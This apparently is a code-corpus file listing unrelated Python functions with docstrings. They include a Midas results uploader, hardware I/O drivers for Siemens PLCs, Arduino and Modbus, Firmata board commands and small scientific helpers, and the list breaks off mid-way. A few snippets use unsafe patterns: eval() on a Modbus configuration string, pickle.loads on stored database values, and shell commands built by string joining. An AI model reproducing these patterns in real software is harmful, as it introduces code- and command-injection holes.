            "def upload_json_results(self, token, filepath, community_id,\n                            producer_display_name, metric_name,\n                            producer_revision, submit_time, **kwargs):\n        \"\"\"\n        Upload a JSON file containing numeric scoring results to be added as\n        scalars. File is parsed and then deleted from the server.\n\n        :param token: A valid token for the user in question.\n        :param filepath: The path to the JSON file.\n        :param community_id: The id of the community that owns the producer.\n        :param producer_display_name: The display name of the producer.\n        :param producer_revision: The repository revision of the producer\n            that produced this value.\n        :param submit_time: The submit timestamp. Must be parsable with PHP\n            strtotime().\n        :param config_item_id: (optional) If this value pertains to a specific\n            configuration item, pass its id here.\n        :param test_dataset_id: (optional) If this value pertains to a\n            specific test dataset, pass its id here.\n        :param truth_dataset_id: (optional) If this value pertains to a\n            specific ground truth dataset, pass its id here.\n        :param parent_keys: (optional) Semicolon-separated list of parent keys\n            to look for numeric results under. Use '.' to denote nesting, like\n            in normal javascript syntax.\n        :param silent: (optional) If true, do not perform threshold-based email\n            notifications for this scalar.\n        :param unofficial: (optional) If true, creates an unofficial scalar\n            visible only to the user performing the submission.\n        :param build_results_url: (optional) A URL for linking to build results\n            for this submission.\n        :param branch: (optional) The branch name in the source repository for\n            this submission.\n        :param params: (optional) Any key/value pairs that should be displayed\n            with this scalar result.\n        :type params: dict\n        :param extra_urls: (optional) Other URL's that should be displayed with\n            with this scalar result. Each element of the list should be a dict\n            with the following keys: label, text, href\n        :type extra_urls: list of dicts\n        :returns: The list of scalars that were created.\n        \"\"\"\n        parameters = dict()\n        parameters['token'] = token\n        parameters['communityId'] = community_id\n        parameters['producerDisplayName'] = producer_display_name\n        parameters['metricName'] = metric_name\n        parameters['producerRevision'] = producer_revision\n        parameters['submitTime'] = submit_time\n        optional_keys = [\n            'config_item_id', 'test_dataset_id', 'truth_dataset_id', 'silent',\n            'unofficial', 'build_results_url', 'branch', 'extra_urls',\n            'params']\n        for key in optional_keys:\n            if key in kwargs:\n                if key == 'config_item_id':\n                    parameters['configItemId'] = kwargs[key]\n                elif key == 'test_dataset_id':\n                    parameters['testDatasetId'] = kwargs[key]\n                elif key == 'truth_dataset_id':\n                    parameters['truthDatasetId'] = kwargs[key]\n                elif key == 'parent_keys':\n                    parameters['parentKeys'] = kwargs[key]\n                elif key == 'build_results_url':\n                    parameters['buildResultsUrl'] = kwargs[key]\n                elif key == 'extra_urls':\n                    parameters['extraUrls'] = json.dumps(kwargs[key])\n                elif key == 'params':\n                    parameters[key] = json.dumps(kwargs[key])\n                elif key == 'silent':\n                    if kwargs[key]:\n                        parameters[key] = kwargs[key]\n                elif key == 'unofficial':\n                    if kwargs[key]:\n                        parameters[key] = kwargs[key]\n                else:\n                    parameters[key] = kwargs[key]\n        file_payload = open(filepath, 'rb')\n        response = self.request('midas.tracker.results.upload.json',\n                                parameters, file_payload)\n        return response"
        ],
        [
            "def __get_rev(self, key, version, **kwa):\n    '''Obtain particular version of the doc at key.'''\n    if '_doc' in kwa:\n      doc = kwa['_doc']\n    else:\n      if type(version) is int:\n        if version == 0:\n          order = pymongo.ASCENDING\n        elif version == -1:\n          order = pymongo.DESCENDING\n        doc = self._collection.find_one({'k': key}, sort=[['d', order]])\n      elif type(version) is datetime:\n        ver = self.__round_time(version)\n        doc = self._collection.find_one({'k': key, 'd': ver})\n\n    if doc is None:\n      raise KeyError('Supplied key `{0}` or version `{1}` does not exist'\n          .format(key, str(version)))\n\n    coded_val = doc['v']\n    return pickle.loads(coded_val)"
        ],
        [
            "def _hashkey(self, method, url, **kwa):\n    '''Find a hash value for the linear combination of invocation methods.\n    '''\n    to_hash = ''.join([str(method), str(url),\n        str(kwa.get('data', '')),\n        str(kwa.get('params', ''))\n    ])\n    return hashlib.md5(to_hash.encode()).hexdigest()"
        ],
        [
            "def setup(self, address, rack=0, slot=1, port=102):\n        \"\"\"Connects to a Siemens S7 PLC.\n\n        Connects to a Siemens S7 using the Snap7 library.\n        See [the snap7 documentation](http://snap7.sourceforge.net/) for\n        supported models and more details.\n\n        It's not currently possible to query the device for available pins,\n        so `available_pins()` returns an empty list. Instead, you should use\n        `map_pin()` to map to a Merker, Input or Output in the PLC. The\n        internal id you should use is a string following this format:\n        '[DMQI][XBWD][0-9]+.?[0-9]*' where:\n\n        * [DMQI]: D for DB, M for Merker, Q for Output, I for Input\n        * [XBWD]: X for bit, B for byte, W for word, D for dword\n        * [0-9]+: Address of the resource\n        * [0-9]*: Bit of the address (type X only, ignored in others)\n\n        For example: 'IB100' will read a byte from an input at address 100 and\n        'MX50.2' will read/write bit 2 of the Merker at address 50. It's not\n        allowed to write to inputs (I), but you can read/write Outpus, DBs and\n        Merkers. If it's disallowed by the PLC, an exception will be thrown by\n        python-snap7 library.\n\n        For this library to work, it might be needed to change some settings\n        in the PLC itself. See\n        [the snap7 documentation](http://snap7.sourceforge.net/) for more\n        information. You also need to put the PLC in RUN mode. Not however that\n        having a Ladder program downloaded, running and modifying variables\n        will probably interfere with inputs and outputs, so put it in RUN mode,\n        but preferably without a downloaded program.\n\n        @arg address IP address of the module.\n        @arg rack rack where the module is installed.\n        @arg slot slot in the rack where the module is installed.\n        @arg port port the PLC is listenning to.\n\n        @throw RuntimeError if something went wrong\n        @throw any exception thrown by `snap7`'s methods.\n        \"\"\"\n        rack = int(rack)\n        slot = int(slot)\n        port = int(port)\n        address = str(address)\n        self._client = snap7.client.Client()\n        self._client.connect(address, rack, slot, port)"
        ],
        [
            "def setup(self, port):\n        \"\"\"Connects to an Arduino UNO on serial port `port`.\n\n        @throw RuntimeError can't connect to Arduino\n        \"\"\"\n        port = str(port)\n        # timeout is used by all I/O operations\n        self._serial = serial.Serial(port, 115200, timeout=2)\n        time.sleep(2)  # time to Arduino reset\n\n        if not self._serial.is_open:\n            raise RuntimeError('Could not connect to Arduino')\n\n        self._serial.write(b'\\x01')\n\n        if self._serial.read() != b'\\x06':\n            raise RuntimeError('Could not connect to Arduino')\n\n        ps = [p for p in self.available_pins() if p['digital']['output']]\n        for pin in ps:\n            self._set_pin_direction(pin['id'], ahio.Direction.Output)"
        ],
        [
            "def block_resource_fitnesses(self, block: block.Block):\n        \"\"\"Returns a map of nodename to average fitness value for this block.\n        Assumes that required resources have been checked on all nodes.\"\"\"\n\n        # Short-circuit! My algorithm is terrible, so it doesn't work well for the edge case where\n        # the block has no requirements\n        if not block.resources:\n            return {n: 1 for n in self.config.nodes.keys()}\n\n        node_fitnesses = {}\n\n        for resource in block.resources:\n            resource_fitnesses = self.resource_fitnesses(resource)\n\n            if not resource_fitnesses:\n                raise UnassignableBlock(block.name)\n\n            max_fit = max(resource_fitnesses.values())\n            min_fit = min(resource_fitnesses.values())\n\n            for node, fitness in resource_fitnesses.items():\n                if node not in node_fitnesses:\n                    node_fitnesses[node] = {}\n\n                if not fitness:\n                    # Since we're rescaling, 0 is now an OK value...\n                    # We will check for `is False` after this\n                    node_fitnesses[node][resource.describe()] = False\n                else:\n                    if max_fit - min_fit:\n                        node_fitnesses[node][resource.describe()] = (fitness - min_fit) / (max_fit - min_fit)\n                    else:\n                        # All the values are the same, default to 1\n                        node_fitnesses[node][resource.describe()] = 1.0\n\n        res = {}\n\n        for node, res_fits in node_fitnesses.items():\n            fit_sum = 0\n            for res_desc, fit in res_fits.items():\n                if fit is False:\n                    fit_sum = False\n                    break\n\n                fit_sum += fit\n\n            if fit_sum is False:\n                # Skip this node entirely\n                res[node] = False\n                continue\n\n            res[node] = fit_sum\n\n        return res"
        ],
        [
            "def available_drivers():\n    \"\"\"Returns a list of available drivers names.\n    \"\"\"\n    global __modules\n    global __available\n\n    if type(__modules) is not list:\n        __modules = list(__modules)\n\n    if not __available:\n        __available = [d.ahioDriverInfo.NAME\n                       for d in __modules\n                       if d.ahioDriverInfo.AVAILABLE]\n\n    return __available"
        ],
        [
            "def map_pin(self, abstract_pin_id, physical_pin_id):\n        \"\"\"Maps a pin number to a physical device pin.\n\n        To make it easy to change drivers without having to refactor a lot of\n        code, this library does not use the names set by the driver to identify\n        a pin. This function will map a number, that will be used by other\n        functions, to a physical pin represented by the drivers pin id. That\n        way, if you need to use another pin or change the underlying driver\n        completly, you only need to redo the mapping.\n\n        If you're developing a driver, keep in mind that your driver will not\n        know about this. The other functions will translate the mapped pin to\n        your id before calling your function.\n\n        @arg abstract_pin_id the id that will identify this pin in the\n        other function calls. You can choose what you want.\n\n        @arg physical_pin_id the id returned in the driver.\n            See `AbstractDriver.available_pins`. Setting it to None removes the\n            mapping.\n        \"\"\"\n        if physical_pin_id:\n            self._pin_mapping[abstract_pin_id] = physical_pin_id\n        else:\n            self._pin_mapping.pop(abstract_pin_id, None)"
        ],
        [
            "def set_pin_direction(self, pin, direction):\n        \"\"\"Sets pin `pin` to `direction`.\n\n        The pin should support the requested mode. Calling this function\n        on a unmapped pin does nothing. Calling it with a unsupported direction\n        throws RuntimeError.\n\n        If you're developing a driver, you should implement\n        _set_pin_direction(self, pin, direction) where `pin` will be one of\n        your internal IDs. If a pin is set to OUTPUT, put it on LOW state.\n\n        @arg pin pin id you've set using `AbstractDriver.map_pin`\n        @arg mode a value from `AbstractDriver.Direction`\n\n        @throw KeyError if pin isn't mapped.\n        @throw RuntimeError if direction is not supported by pin.\n        \"\"\"\n        if type(pin) is list:\n            for p in pin:\n                self.set_pin_direction(p, direction)\n            return\n\n        pin_id = self._pin_mapping.get(pin, None)\n        if pin_id and type(direction) is ahio.Direction:\n            self._set_pin_direction(pin_id, direction)\n        else:\n            raise KeyError('Requested pin is not mapped: %s' % pin)"
        ],
        [
            "def pin_direction(self, pin):\n        \"\"\"Gets the `ahio.Direction` this pin was set to.\n\n        If you're developing a driver, implement _pin_direction(self, pin)\n\n        @arg pin the pin you want to see the mode\n        @returns the `ahio.Direction` the pin is set to\n\n        @throw KeyError if pin isn't mapped.\n        \"\"\"\n        if type(pin) is list:\n            return [self.pin_direction(p) for p in pin]\n\n        pin_id = self._pin_mapping.get(pin, None)\n        if pin_id:\n            return self._pin_direction(pin_id)\n        else:\n            raise KeyError('Requested pin is not mapped: %s' % pin)"
        ],
        [
            "def set_pin_type(self, pin, ptype):\n        \"\"\"Sets pin `pin` to `type`.\n\n        The pin should support the requested mode. Calling this function\n        on a unmapped pin does nothing. Calling it with a unsupported mode\n        throws RuntimeError.\n\n        If you're developing a driver, you should implement\n        _set_pin_type(self, pin, ptype) where `pin` will be one of your\n        internal IDs. If a pin is set to OUTPUT, put it on LOW state.\n\n        @arg pin pin id you've set using `AbstractDriver.map_pin`\n        @arg mode a value from `AbstractDriver.PortType`\n\n        @throw KeyError if pin isn't mapped.\n        @throw RuntimeError if type is not supported by pin.\n        \"\"\"\n        if type(pin) is list:\n            for p in pin:\n                self.set_pin_type(p, ptype)\n            return\n\n        pin_id = self._pin_mapping.get(pin, None)\n        if type(ptype) is not ahio.PortType:\n            raise KeyError('ptype must be of type ahio.PortType')\n        elif pin_id:\n            self._set_pin_type(pin_id, ptype)\n        else:\n            raise KeyError('Requested pin is not mapped: %s' % pin)"
        ],
        [
            "def pin_type(self, pin):\n        \"\"\"Gets the `ahio.PortType` this pin was set to.\n\n        If you're developing a driver, implement _pin_type(self, pin)\n\n        @arg pin the pin you want to see the mode\n        @returns the `ahio.PortType` the pin is set to\n\n        @throw KeyError if pin isn't mapped.\n        \"\"\"\n        if type(pin) is list:\n            return [self.pin_type(p) for p in pin]\n\n        pin_id = self._pin_mapping.get(pin, None)\n        if pin_id:\n            return self._pin_type(pin_id)\n        else:\n            raise KeyError('Requested pin is not mapped: %s' % pin)"
        ],
        [
            "def write(self, pin, value, pwm=False):\n        \"\"\"Sets the output to the given value.\n\n        Sets `pin` output to given value. If the pin is in INPUT mode, do\n        nothing. If it's an analog pin, value should be in write_range.\n        If it's not in the allowed range, it will be clamped. If pin is in\n        digital mode, value can be `ahio.LogicValue` if `pwm` = False, or a\n        number between 0 and 1 if `pwm` = True. If PWM is False, the pin will\n        be set to HIGH or LOW, if `pwm` is True, a PWM wave with the given\n        cycle will be created. If the pin does not support PWM and `pwm` is\n        True, raise RuntimeError. The `pwm` argument should be ignored in case\n        the pin is analog. If value is not valid for the given\n        pwm/analog|digital combination, raise TypeError.\n\n        If you're developing a driver, implement _write(self, pin, value, pwm)\n\n        @arg pin the pin to write to\n        @arg value the value to write on the pin\n        @arg pwm wether the output should be a pwm wave\n\n        @throw RuntimeError if the pin does not support PWM and `pwm` is True.\n        @throw TypeError if value is not valid for this pin's mode and pwm\n               value.\n        @throw KeyError if pin isn't mapped.\n        \"\"\"\n        if type(pin) is list:\n            for p in pin:\n                self.write(p, value, pwm)\n            return\n\n        if pwm and type(value) is not int and type(value) is not float:\n            raise TypeError('pwm is set, but value is not a float or int')\n\n        pin_id = self._pin_mapping.get(pin, None)\n        if pin_id:\n            lpin = self._pin_lin.get(pin, None)\n            if lpin and type(lpin['write']) is tuple:\n                write_range = lpin['write']\n                value = self._linear_interpolation(value, *write_range)\n            self._write(pin_id, value, pwm)\n        else:\n            raise KeyError('Requested pin is not mapped: %s' % pin)"
        ],
        [
            "def read(self, pin):\n        \"\"\"Reads value from pin `pin`.\n\n        Returns the value read from pin `pin`. If it's an analog pin, returns\n        a number in analog.input_range. If it's digital, returns\n        `ahio.LogicValue`.\n\n        If you're developing a driver, implement _read(self, pin)\n\n        @arg pin the pin to read from\n        @returns the value read from the pin\n\n        @throw KeyError if pin isn't mapped.\n        \"\"\"\n        if type(pin) is list:\n            return [self.read(p) for p in pin]\n\n        pin_id = self._pin_mapping.get(pin, None)\n        if pin_id:\n            value = self._read(pin_id)\n            lpin = self._pin_lin.get(pin, None)\n            if lpin and type(lpin['read']) is tuple:\n                read_range = lpin['read']\n                value = self._linear_interpolation(value, *read_range)\n            return value\n        else:\n            raise KeyError('Requested pin is not mapped: %s' % pin)"
        ],
        [
            "def set_analog_reference(self, reference, pin=None):\n        \"\"\"Sets the analog reference to `reference`\n\n        If the driver supports per pin reference setting, set pin to the\n        desired reference. If not, passing None means set to all, which is the\n        default in most hardware. If only per pin reference is supported and\n        pin is None, raise RuntimeError.\n\n        If you're developing a driver, implement\n        _set_analog_reference(self, reference, pin). Raise RuntimeError if pin\n        was set but is not supported by the platform.\n\n        @arg reference the value that describes the analog reference. See\n            `AbstractDriver.analog_references`\n        @arg pin if the the driver supports it, the pin that will use\n            `reference` as reference. None for all.\n\n        @throw RuntimeError if pin is None on a per pin only hardware, or if\n            it's a valid pin on a global only analog reference hardware.\n        @throw KeyError if pin isn't mapped.\n        \"\"\"\n        if pin is None:\n            self._set_analog_reference(reference, None)\n        else:\n            pin_id = self._pin_mapping.get(pin, None)\n            if pin_id:\n                self._set_analog_reference(reference, pin_id)\n            else:\n                raise KeyError('Requested pin is not mapped: %s' % pin)"
        ],
        [
            "def analog_reference(self, pin=None):\n        \"\"\"Returns the analog reference.\n\n        If the driver supports per pin analog reference setting, returns the\n        reference for pin `pin`. If pin is None, returns the global analog\n        reference. If only per pin reference is supported and pin is None,\n        raise RuntimeError.\n\n        If you're developing a driver, implement _analog_reference(self, pin)\n\n        @arg pin if the the driver supports it, the pin that will use\n            `reference` as reference. None for all.\n\n        @returns the reference used for pin\n\n        @throw RuntimeError if pin is None on a per pin only hardware, or if\n            it's a valid pin on a global only analog reference hardware.\n        @throw KeyError if pin isn't mapped.\n        \"\"\"\n        if pin is None:\n            return self._analog_reference(None)\n        else:\n            pin_id = self._pin_mapping.get(pin, None)\n            if pin_id:\n                return self._analog_reference(pin_id)\n            else:\n                raise KeyError('Requested pin is not mapped: %s' % pin)"
        ],
        [
            "def set_pwm_frequency(self, frequency, pin=None):\n        \"\"\"Sets PWM frequency, if supported by hardware\n\n        If the driver supports per pin frequency setting, set pin to the\n        desired frequency. If not, passing None means set to all. If only per\n        pin frequency is supported and pin is None, raise RuntimeError.\n\n        If you're developing a driver, implement\n        _set_pwm_frequency(self, frequency, pin). Raise RuntimeError if pin\n        was set but is not supported by the platform.\n\n        @arg frequency pwm frequency to be set, in Hz\n        @arg pin if the the driver supports it, the pin that will use\n            `frequency` as pwm frequency. None for all/global.\n\n        @throw RuntimeError if pin is None on a per pin only hardware, or if\n            it's a valid pin on a global only hardware.\n        @throw KeyError if pin isn't mapped.\n        \"\"\"\n        if pin is None:\n            self._set_pwm_frequency(frequency, None)\n        else:\n            pin_id = self._pin_mapping.get(pin, None)\n            if pin_id:\n                self._set_pwm_frequency(frequency, pin_id)\n            else:\n                raise KeyError('Requested pin is not mapped: %s' % pin)"
        ],
        [
            "def SIRode(y0, time, beta, gamma):\n    \"\"\"Integrate SIR epidemic model\n\n    Simulate a very basic deterministic SIR system.\n\n    :param 2x1 numpy array y0: initial conditions\n    :param Ntimestep length numpy array time: Vector of time points that \\\n    solution is returned at\n    :param float beta: transmission rate\n    :param float gamma: recovery rate\n\n    :returns: (2)x(Ntimestep) numpy array Xsim: first row S(t), second row I(t)\n    \n    \"\"\"\n    \n    Xsim = rk4(SIR_D, y0, time, args=(beta,gamma,))\n    Xsim = Xsim.transpose()\n    return Xsim"
        ],
        [
            "def url(self):\n        \"\"\"\n        Return the URL of the server.\n\n        :returns: URL of the server\n        :rtype: string\n        \"\"\"\n        if len(self.drivers) > 0:\n            return self.drivers[0].url\n        else:\n            return self._url"
        ],
        [
            "def guess_array_memory_usage( bam_readers, dtype, use_strand=False ):\n    \"\"\"Returns an estimate for the maximum amount of memory to be consumed by numpy arrays.\"\"\"\n    ARRAY_COUNT = 5\n    if not isinstance( bam_readers, list ):\n        bam_readers = [ bam_readers ]\n    if isinstance( dtype, basestring ):\n        dtype = NUMPY_DTYPES.get( dtype, None )\n    use_strand = use_strand + 1 #if false, factor of 1, if true, factor of 2\n    dtypes = guess_numpy_dtypes_from_idxstats( bam_readers, default=None, force_dtype=False )\n    if not [ dt for dt in dtypes if dt is not None ]:\n        #found no info from idx\n        dtypes = guess_numpy_dtypes_from_idxstats( bam_readers, default=dtype or numpy.uint64, force_dtype=True )\n    elif dtype:\n        dtypes = [ dtype if dt else None for dt in dtypes ]\n    read_groups = []\n    no_read_group = False\n    for bam in bam_readers:\n        rgs = bam.get_read_groups()\n        if rgs:\n            for rg in rgs:\n                if rg not in read_groups:\n                    read_groups.append( rg )\n        else:\n            no_read_group = True\n    read_groups = len( read_groups ) + no_read_group\n    max_ref_size = 0\n    array_byte_overhead = sys.getsizeof( numpy.zeros( ( 0 ), dtype=numpy.uint64 ) )\n    array_count = ARRAY_COUNT * use_strand * read_groups\n    for bam in bam_readers:\n        for i, ( name, length ) in enumerate( bam.get_references() ):\n            if dtypes[i] is not None:\n                max_ref_size = max( max_ref_size, ( length + length * dtypes[i]().nbytes * array_count + ( array_byte_overhead * ( array_count + 1 ) ) ) )\n    return max_ref_size"
        ],
        [
            "def main():\n    \"\"\"Create coverage reports and open them in the browser.\"\"\"\n    usage = \"Usage: %prog PATH_TO_PACKAGE\"\n    parser = optparse.OptionParser(usage=usage)\n    parser.add_option(\n        \"-v\", \"--verbose\",\n        action=\"store_true\", dest=\"verbose\", default=False,\n        help=\"Show debug output\")\n    parser.add_option(\n        \"-d\", \"--output-dir\",\n        action=\"store\", type=\"string\", dest=\"output_dir\",\n        default='',\n        help=\"\")\n    parser.add_option(\n        \"-t\", \"--test-args\",\n        action=\"store\", type=\"string\", dest=\"test_args\",\n        default='',\n        help=(\"Pass argument on to bin/test. Quote the argument, \" +\n              \"for instance \\\"-t '-m somemodule'\\\".\"))\n    (options, args) = parser.parse_args()\n    if options.verbose:\n        log_level = logging.DEBUG\n    else:\n        log_level = logging.INFO\n    logging.basicConfig(level=log_level,\n                        format=\"%(levelname)s: %(message)s\")\n\n    curdir = os.getcwd()\n    testbinary = os.path.join(curdir, 'bin', 'test')\n    if not os.path.exists(testbinary):\n        raise RuntimeError(\"Test command doesn't exist: %s\" % testbinary)\n\n    coveragebinary = os.path.join(curdir, 'bin', 'coverage')\n    if not os.path.exists(coveragebinary):\n        logger.debug(\"Trying globally installed coverage command.\")\n        coveragebinary = 'coverage'\n\n    logger.info(\"Running tests in coverage mode (can take a long time)\")\n    parts = [coveragebinary, 'run', testbinary]\n    if options.test_args:\n        parts.append(options.test_args)\n    system(\" \".join(parts))\n    logger.debug(\"Creating coverage reports...\")\n    if options.output_dir:\n        coverage_dir = options.output_dir\n        open_in_browser = False\n    else:\n        coverage_dir = 'htmlcov'  # The default\n        open_in_browser = True\n    system(\"%s html --directory=%s\" % (coveragebinary, coverage_dir))\n    logger.info(\"Wrote coverage files to %s\", coverage_dir)\n    if open_in_browser:\n        index_file = os.path.abspath(\n            os.path.join(coverage_dir, 'index.html'))\n        logger.debug(\"About to open %s in your webbrowser.\", index_file)\n        webbrowser.open('file://' + index_file)\n        logger.info(\"Opened reports in your browser.\")"
        ],
        [
            "def setup(\n            self,\n            configuration=\"ModbusSerialClient(method='rtu',port='/dev/cu.usbmodem14101',baudrate=9600)\"\n    ):\n        \"\"\"Start a Modbus server.\n\n        The following classes are available with their respective named\n        parameters:\n        \n        ModbusTcpClient\n            host: The host to connect to (default 127.0.0.1)\n            port: The modbus port to connect to (default 502)\n            source_address: The source address tuple to bind to (default ('', 0))\n            timeout: The timeout to use for this socket (default Defaults.Timeout)\n\n        ModbusUdpClient\n            host: The host to connect to (default 127.0.0.1)\n            port: The modbus port to connect to (default 502)\n            timeout: The timeout to use for this socket (default None)\n\n        ModbusSerialClient\n            method: The method to use for connection (asii, rtu, binary)\n            port: The serial port to attach to\n            stopbits: The number of stop bits to use (default 1)\n            bytesize: The bytesize of the serial messages (default 8 bits)\n            parity: Which kind of parity to use (default None)\n            baudrate: The baud rate to use for the serial device\n            timeout: The timeout between serial requests (default 3s)\n\n        When configuring the ports, the following convention should be\n        respected:\n        \n        portname: C1:13 -> Coil on device 1, address 13\n\n        The letters can be:\n\n        C = Coil\n        I = Input\n        R = Register\n        H = Holding\n\n        @arg configuration a string that instantiates one of those classes.\n\n        @throw RuntimeError can't connect to Arduino\n        \"\"\"\n        from pymodbus3.client.sync import ModbusSerialClient, ModbusUdpClient, ModbusTcpClient\n        self._client = eval(configuration)\n        self._client.connect()"
        ],
        [
            "def get_exception_from_status_and_error_codes(status_code, error_code, value):\n    \"\"\"\n    Return an exception given status and error codes.\n\n    :param status_code: HTTP status code.\n    :type status_code: None | int\n    :param error_code: Midas Server error code.\n    :type error_code: None | int\n    :param value: Message to display.\n    :type value: string\n    :returns: Exception.\n    :rtype : pydas.exceptions.ResponseError\n    \"\"\"\n    if status_code == requests.codes.bad_request:\n        exception = BadRequest(value)\n    elif status_code == requests.codes.unauthorized:\n        exception = Unauthorized(value)\n    elif status_code == requests.codes.forbidden:\n        exception = Unauthorized(value)\n    elif status_code in [requests.codes.not_found, requests.codes.gone]:\n        exception = NotFound(value)\n    elif status_code == requests.codes.method_not_allowed:\n        exception = MethodNotAllowed(value)\n    elif status_code >= requests.codes.bad_request:\n        exception = HTTPError(value)\n    else:\n        exception = ResponseError(value)\n\n    if error_code == -100:  # MIDAS_INTERNAL_ERROR\n        exception = InternalError(value)\n    elif error_code == -101:  # MIDAS_INVALID_TOKEN\n        exception = InvalidToken(value)\n    elif error_code == -105:  # MIDAS_UPLOAD_FAILED\n        exception = UploadFailed(value)\n    elif error_code == -140:  # MIDAS_UPLOAD_TOKEN_GENERATION_FAILED\n        exception = UploadTokenGenerationFailed(value)\n    elif error_code == -141:  # MIDAS_INVALID_UPLOAD_TOKEN\n        exception = InvalidUploadToken(value)\n    elif error_code == -150:  # MIDAS_INVALID_PARAMETER\n        exception = InvalidParameter(value)\n    elif error_code == -151:  # MIDAS_INVALID_POLICY\n        exception = InvalidPolicy(value)\n\n    return exception"
        ],
        [
            "def analog_read(self, pin):\n        \"\"\"\n        Retrieve the last analog data value received for the specified pin.\n\n        :param pin: Selected pin\n\n        :return: The last value entered into the analog response table.\n        \"\"\"\n        with self.data_lock:\n            data = self._command_handler.analog_response_table[pin][self._command_handler.RESPONSE_TABLE_PIN_DATA_VALUE]\n        return data"
        ],
        [
            "def disable_analog_reporting(self, pin):\n        \"\"\"\n        Disables analog reporting for a single analog pin.\n\n        :param pin: Analog pin number. For example for A0, the number is 0.\n\n        :return: No return value\n        \"\"\"\n        command = [self._command_handler.REPORT_ANALOG + pin, self.REPORTING_DISABLE]\n        self._command_handler.send_command(command)"
        ],
        [
            "def disable_digital_reporting(self, pin):\n        \"\"\"\n        Disables digital reporting. By turning reporting off for this pin, reporting\n        is disabled for all 8 bits in the \"port\" -\n\n        :param pin: Pin and all pins for this port\n\n        :return: No return value\n        \"\"\"\n        port = pin // 8\n        command = [self._command_handler.REPORT_DIGITAL + port, self.REPORTING_DISABLE]\n        self._command_handler.send_command(command)"
        ],
        [
            "def enable_analog_reporting(self, pin):\n        \"\"\"\n        Enables analog reporting. By turning reporting on for a single pin.\n\n        :param pin: Analog pin number. For example for A0, the number is 0.\n\n        :return: No return value\n        \"\"\"\n        command = [self._command_handler.REPORT_ANALOG + pin, self.REPORTING_ENABLE]\n        self._command_handler.send_command(command)"
        ],
        [
            "def enable_digital_reporting(self, pin):\n        \"\"\"\n        Enables digital reporting. By turning reporting on for all 8 bits in the \"port\" -\n        this is part of Firmata's protocol specification.\n\n        :param pin: Pin and all pins for this port\n\n        :return: No return value\n        \"\"\"\n        port = pin // 8\n        command = [self._command_handler.REPORT_DIGITAL + port, self.REPORTING_ENABLE]\n        self._command_handler.send_command(command)"
        ],
        [
            "def extended_analog(self, pin, data):\n        \"\"\"\n        This method will send an extended data analog output command to the selected pin\n\n        :param pin: 0 - 127\n\n        :param data: 0 - 0xfffff\n        \"\"\"\n        analog_data = [pin, data & 0x7f, (data >> 7) & 0x7f, (data >> 14) & 0x7f]\n        self._command_handler.send_sysex(self._command_handler.EXTENDED_ANALOG, analog_data)"
        ],
        [
            "def get_stepper_version(self, timeout=20):\n        \"\"\"\n        Get the stepper library version number.\n\n        :param timeout: specify a time to allow arduino to process and return a version\n\n        :return: the stepper version number if it was set.\n        \"\"\"\n        # get current time\n        start_time = time.time()\n\n        # wait for up to 20 seconds for a successful capability query to occur\n\n        while self._command_handler.stepper_library_version <= 0:\n            if time.time() - start_time > timeout:\n                if self.verbose is True:\n                    print(\"Stepper Library Version Request timed-out. \"\n                          \"Did you send a stepper_request_library_version command?\")\n                return\n            else:\n                pass\n        return self._command_handler.stepper_library_version"
        ],
        [
            "def i2c_write(self, address, *args):\n        \"\"\"\n        Write data to an i2c device.\n\n        :param address: i2c device address\n\n        :param args: A variable number of bytes to be sent to the device\n        \"\"\"\n        data = [address, self.I2C_WRITE]\n        for item in args:\n            data.append(item & 0x7f)\n            data.append((item >> 7) & 0x7f)\n        self._command_handler.send_sysex(self._command_handler.I2C_REQUEST, data)"
        ],
        [
            "def i2c_stop_reading(self, address):\n        \"\"\"\n        This method stops an I2C_READ_CONTINUOUSLY operation for the i2c device address specified.\n\n        :param address: address of i2c device\n        \"\"\"\n        data = [address, self.I2C_STOP_READING]\n        self._command_handler.send_sysex(self._command_handler.I2C_REQUEST, data)"
        ],
        [
            "def play_tone(self, pin, tone_command, frequency, duration):\n        \"\"\"\n        This method will call the Tone library for the selected pin.\n        If the tone command is set to TONE_TONE, then the specified tone will be played.\n        Else, if the tone command is TONE_NO_TONE, then any currently playing tone will be disabled.\n        It is intended for a future release of Arduino Firmata\n\n        :param pin: Pin number\n\n        :param tone_command: Either TONE_TONE, or TONE_NO_TONE\n\n        :param frequency: Frequency of tone in hz\n\n        :param duration: Duration of tone in milliseconds\n\n        :return: No return value\n        \"\"\"\n\n        # convert the integer values to bytes\n        if tone_command == self.TONE_TONE:\n            # duration is specified\n            if duration:\n                data = [tone_command, pin, frequency & 0x7f, (frequency >> 7) & 0x7f, duration & 0x7f, (duration >> 7) & 0x7f]\n\n            else:\n                data = [tone_command, pin, frequency & 0x7f, (frequency >> 7) & 0x7f, 0, 0]\n\n            self._command_handler.digital_response_table[pin][self._command_handler.RESPONSE_TABLE_MODE] = \\\n                self.TONE\n        # turn off tone\n        else:\n            data = [tone_command, pin]\n        self._command_handler.send_sysex(self._command_handler.TONE_PLAY, data)"
        ],
        [
            "def set_analog_latch(self, pin, threshold_type, threshold_value, cb=None):\n        \"\"\"\n        This method \"arms\" an analog pin for its data to be latched and saved in the latching table\n        If a callback method is provided, when latching criteria is achieved, the callback function is called\n        with latching data notification. In that case, the latching table is not updated.\n\n        :param pin: Analog pin number (value following an 'A' designator, i.e. A5 = 5\n\n        :param threshold_type: ANALOG_LATCH_GT | ANALOG_LATCH_LT  | ANALOG_LATCH_GTE | ANALOG_LATCH_LTE\n\n        :param threshold_value: numerical value - between 0 and 1023\n\n        :param cb: callback method\n\n        :return: True if successful, False if parameter data is invalid\n        \"\"\"\n        if self.ANALOG_LATCH_GT <= threshold_type <= self.ANALOG_LATCH_LTE:\n            if 0 <= threshold_value <= 1023:\n                self._command_handler.set_analog_latch(pin, threshold_type, threshold_value, cb)\n                return True\n        else:\n            return False"
        ],
        [
            "def set_digital_latch(self, pin, threshold_type, cb=None):\n        \"\"\"\n        This method \"arms\" a digital pin for its data to be latched and saved in the latching table\n        If a callback method is provided, when latching criteria is achieved, the callback function is called\n        with latching data notification. In that case, the latching table is not updated.\n\n        :param pin: Digital pin number\n\n        :param threshold_type: DIGITAL_LATCH_HIGH | DIGITAL_LATCH_LOW\n\n        :param cb: callback function\n\n        :return: True if successful, False if parameter data is invalid\n        \"\"\"\n        if 0 <= threshold_type <= 1:\n            self._command_handler.set_digital_latch(pin, threshold_type, cb)\n            return True\n        else:\n            return False"
        ],
        [
